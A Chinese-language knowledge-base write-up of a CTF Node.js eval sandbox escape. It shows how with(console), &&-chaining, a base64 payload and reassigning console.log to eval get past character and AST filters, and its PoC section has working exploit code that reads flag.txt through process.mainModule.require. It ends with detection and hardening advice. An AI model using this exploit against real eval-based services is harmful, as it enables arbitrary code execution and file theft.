---
id: binary-pwn-sandbox-escape-nodejs-eval-char-ast-filter-with-consolelog-eval
title: Node.js eval 沙箱字符+AST 双层过滤绕过：with 取属性、&& 串联、console.log 换成 eval
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: nodejs-eval-char-ast-filter-with-consolelog-eval-bypass
tags:
- javascript
- nodejs
- eval
- sandbox-escape
- ast
- filter-bypass
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:02:20+08:00'
  notes: 已对照原文js-without-getattr核对：字符黑名单+esprima AST禁节点、with(console)、&&、console.log=eval、base64 payload一致；未验证点：未复跑。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-nodejs-eval-char-ast-filter-with-consolelog-eval/
draft: false
kb_aliases:
- js-without-getattr
- JailCTF 2024 js-without-getattr
- with(console)
- console.log=eval
- base64 AST 绕过
---

## 一句话结论

当 Node.js 沙箱先做字符黑名单（禁 `.`、`;`、`,`、空格等）再用 esprima 的 AST 禁止 `CallExpression`、`MemberExpression`、`VariableDeclaration` 等节点后才 `eval` 时，可以用 `with(console){...}` 在不写点号的情况下访问属性、用 `&&` 代替分号串联语句、把运行时 payload 藏进 base64 字符串绕过 AST 检查，最后把宿主传入的 `console.log` 赋值为 `eval`，借宿主自己的 `console.log(res)` 执行 payload。

## 原理

- **字符层**：过滤禁用了 `.`、`;`、`,`、`:`、`[`、`]`、引号、空格、制表符和换行、反斜杠，以及字母 `u`、`p`、`x`、`q`，还禁止 `<`、`>`。目的显然是让攻击者无法直接写成员访问、函数调用参数、数组和多语句。
- **AST 层**：`visit` 递归遍历 esprima AST，禁止 `VariableDeclaration`、`SpreadElement`、`NewExpression`、`CallExpression`、`MemberExpression`、`ArrayExpression`、`Property`、`Proxy`、`__proto__`、`instanceof` 等节点类型。即使字符串里出现这些单词，只要 AST 节点类型不是它们就放行。
- **绕过 1（属性访问）**：`with(console){ log(...) }` 让 `log` 在 `console` 对象上解析，不需要 `console.log` 的点号；AST 里是 `WithStatement` + `Identifier`，不是 `MemberExpression`。
- **绕过 2（多语句）**：不能写 `;`，用 `&&`（或 `||`、逗号表达式——但逗号也被禁）把多个赋值串成一个表达式；赋值语句不是 `CallExpression`。
- **绕过 3（调用）**：不能出现 `CallExpression`，但可以把调用写成**字符串**，运行时再用 `eval`/`atob` 执行；AST 只看到一个 `Literal`。
- **绕过 4（宿主回调劫持）**：`with(console){ log=eval }` 把宿主对象的 `console.log` 属性改成 `eval`。沙箱 `eval(inp)` 返回最后一个表达式的字符串 `'eval(atob(a))'`；宿主随后执行 `console.log(res)`，实际调用的是被替换后的 `eval`，从而执行 `eval(atob(a))`。
- **绕过 5（字符串黑名单）**：base64 里不直接出现被禁子串；若 base64 恰好包含 `upxq`，可在编码串中插入空格后用运行时 `.replace(' ', '')` 去掉（该 `.replace` 在解码后的 payload 里，AST 看不到）。
- 本质：字符过滤和 AST 过滤都只检查“静态源码长什么样”，但 `with`、宿主对象引用和 `eval` 把真正的执行推迟到运行时；只要沙箱里存在宿主对象的引用（`console`），就能通过改属性把宿主回调变成执行原语。

## 触发条件

- 沙箱直接 `eval(userInput)`，并在 eval 前后暴露了宿主对象（`console`、`process`、全局函数等）。
- 过滤是“字符黑名单 + AST 节点类型黑名单”，且没有把 `with`、赋值、字符串字面量、`&&` 纳入禁止范围。
- eval 结果会被宿主代码使用（如 `console.log(res)`、`res.toString()`、作为回调参数等），使被篡改的宿主属性有机会被调用。
- Node 版本支持 `process.mainModule`（较老版本；ESM/新版本可能为 undefined，需要换 `process.binding`/`import()` 等路径）。

## 利用步骤

1. 确认禁用字符集与 AST 禁止节点；特别确认 `with`、赋值、单引号字符串、`&&`、括号是否可用。
2. 构造外层表达式：`with(console){(log=eval)&&(a='<base64>')&&'eval(atob(a))'}`。这段源码不含被禁字符，AST 中也没有 `CallExpression`/`MemberExpression`/`VariableDeclaration`。
3. 生成 base64 payload，例如：
   ```js
   let payload = ` console . info(process["mai"+ "nModule"]. require('fs')["readF"+ "ileSync"]('flag.txt')["toStr"+ "ing"]())`;
   payload = btoa(payload);
   ```
   这段 payload 只在运行时解码，AST 看到的是 base64 字符串。
4. 提交外层表达式；沙箱 `eval` 执行后返回字符串 `eval(atob(a))`，同时 `console.log` 已被替换为 `eval`。
5. 宿主执行 `console.log(res)` 时实际执行 `eval('eval(atob(a))')`，解码并运行 payload，读取 `flag.txt`。
6. 若 base64 中出现 `upxq` 等被禁子串，在 base64 中插入空格，payload 内用 `.replace(' ', '')` 还原；若 `process.mainModule` 不可用，改用 `process.binding`、`globalThis.process` 或 `import('fs')`。

## PoC

```js
// 服务端核心（简化）
const {parseScript} = require('esprima');
rl.question('can you js without getattr? > ', (inp) => {
  // 字符过滤：禁 <.;,;.>:`[tab/newline]`upxq"\ 空格
  // AST 过滤：禁 VariableDeclaration/SpreadElement/NewExpression/CallExpression/
  //           Proxy/__defineGetter__/__proto__/Property/MemberExpression/ArrayExpression/instanceof
  let res = eval(inp);
  console.log(res);
});
```

```js
// 攻击侧生成
let payload = ` console .  info(process["mai"+ "nModule"]. require('fs' )["readF"+  "ileSync"](  'flag.txt' )["toStr"+ "ing"]())`;
payload = btoa(payload);
const inp = `with(console){(log=eval)&&(a='${payload}')&&'eval(atob(a))'}`;
console.log(inp);
```

```text
# 实际提交的 inp 不含点号/分号/逗号/空格/双引号；
# 运行时：
#   1) with(console) 把 console.log 赋成 eval
#   2) a = base64(payload)
#   3) eval 返回字符串 'eval(atob(a))'
#   4) 宿主 console.log(res) 变成 eval('eval(atob(a))') → 执行 payload
```

## 变体与关联

- 若 `with` 被禁，可用 `for (k in console)`、解构赋值、`import` 动态导入等无点号属性访问方式；若 `&&` 被禁，可用嵌套三元、逗号表达式（若未被禁）。
- 若宿主不使用 `console.log(res)`，可寻找其他会被调用的宿主回调/对象方法（`toString`、`valueOf`、`then`、事件处理器），把其中一个属性替换成 `eval` 或 `Function`。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（Node 原生 vm 的 `this.constructor.constructor` 逃逸）、[[binary-pwn-sandbox-escape-vm2-cross-realm-implicit-call]]（vm2 跨 Realm 回调未清洗）。
- 边界：若沙箱使用独立的 `vm` context 且不把宿主 `console` 对象传进去，`with(console)` 无对象可写；若 eval 结果不被宿主使用、或 `eval` 本身被移除，本链条断开；ESM/新 Node 下 `process.mainModule` 可能不可用。

## 检测与防御

- 检测：审计直接 `eval` 用户输入且暴露宿主对象的代码；对含 `with(`、大量 `&&` 赋值、base64 大字符串、`atob`/`Function` 字样的输入告警；监控宿主对象属性被改写（`console.log` 变为非原生函数）。
- 修复：不要在宿主上下文 `eval` 用户代码；使用 `vm2`/`isolated-vm`/独立 Worker + 结构化克隆，不把宿主对象引用传入沙箱；对 AST 使用白名单（只允许字面量和有限运算），而不是节点黑名单。
- 加固：冻结宿主对象（`Object.freeze(console)`）、隐藏 `process`、禁用 `eval`/`Function`；在低权限子进程中执行并限制文件系统。
